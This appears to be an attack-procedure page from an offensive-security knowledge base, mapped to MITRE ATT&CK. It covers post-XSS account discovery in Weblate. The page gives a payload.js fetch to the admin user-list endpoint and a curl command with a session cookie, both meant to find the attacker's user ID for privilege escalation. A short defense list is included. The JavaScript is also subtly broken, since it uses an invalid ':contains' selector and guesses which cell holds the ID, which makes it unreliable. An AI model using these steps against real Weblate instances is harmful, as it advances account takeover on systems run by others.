---
tags:
  - discovery
  - user-enumeration
type: procedure
tools:
  - '[[tools/payload-js]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/get-weblate-admin-users]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T03:16:20.251Z'
sub_techniques: []
id: 46526d88-555b-4314-92a5-501fa7020661
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# List-Users-via-Weblate-Admin-Endpoint

## Summary

This procedure uses JavaScript from the XSS payload to fetch the admin user list and identify the attacker's user ID for targeted privilege escalation.

## Description

Once XSS executes, `payload.js` sends an authenticated GET to `/admin/weblate_auth/user/` to retrieve the user table HTML. Parsing identifies the attacker's ID (e.g., by username match), enabling subsequent requests to their profile.

## Requirements

1. XSS execution in authenticated context
2. Access to admin endpoints (via session)
3. JavaScript parsing capabilities in payload

## Defense

Defensive measures and detection strategies:

- Restrict admin endpoint access to superusers only
- Monitor for anomalous GETs to admin paths from JS
- Implement rate limiting on admin views

## Objectives

1. Enumerate users to find attacker's ID
2. Gather intel for escalation targeting
3. Avoid direct IDOR by self-identification

## Instructions

### Step 1: Issue GET Request from Payload

**Context**: From `payload.js`, perform an authenticated fetch to the user list endpoint.

Add to `payload.js`:

```javascript
fetch('/admin/weblate_auth/user/').then(r => r.text()).then(html => {
  // Parse HTML for user ID, e.g., via DOMParser or regex
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const attackerRow = doc.querySelector('tr td:contains("attacker_username")');
  const userId = attackerRow ? attackerRow.previousElementSibling.textContent : null;
  // Store userId for next steps
});
```

Equivalent curl for testing: Execute [[commands/get-weblate-admin-users]]:

```bash
curl -X GET "https://weblate-target.com/admin/weblate_auth/user/" -H "Cookie: sessionid=your_session" -H "Referer: https://weblate-target.com/"
```

> Returns HTML table; parse for IDs.

**Expected Output**: HTML with user list, e.g., rows showing ID 5 for attacker.

### Step 2: Extract ID

**Context**: Process response to isolate the ID.

Use JS string methods or regex to extract the numeric ID associated with the attacker's username.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/get-weblate-admin-users]]

## Tools Used

- [[tools/payload-js]]

## Tags

- [[Discovery]]
- [[user-enumeration]]
